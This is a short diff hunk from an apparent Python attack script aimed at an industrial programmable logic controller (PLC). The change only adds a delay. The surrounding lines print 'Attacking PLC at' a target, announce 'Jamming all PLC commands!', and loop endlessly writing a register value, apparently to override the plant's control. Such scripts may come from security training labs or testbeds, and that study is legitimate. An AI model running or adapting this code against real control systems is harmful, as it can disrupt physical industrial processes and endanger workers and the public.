@@ -51,6 +51,7 @@ try:
     print ". . . Please wait."
     time.sleep(3)
     print ". . . Attacking PLC at " + args.target
+    time.sleep(1)
     print ". . . Jamming all PLC commands!"
     while True:
         rq = client.write_register(0x01, 0) # Run Plant, Run!
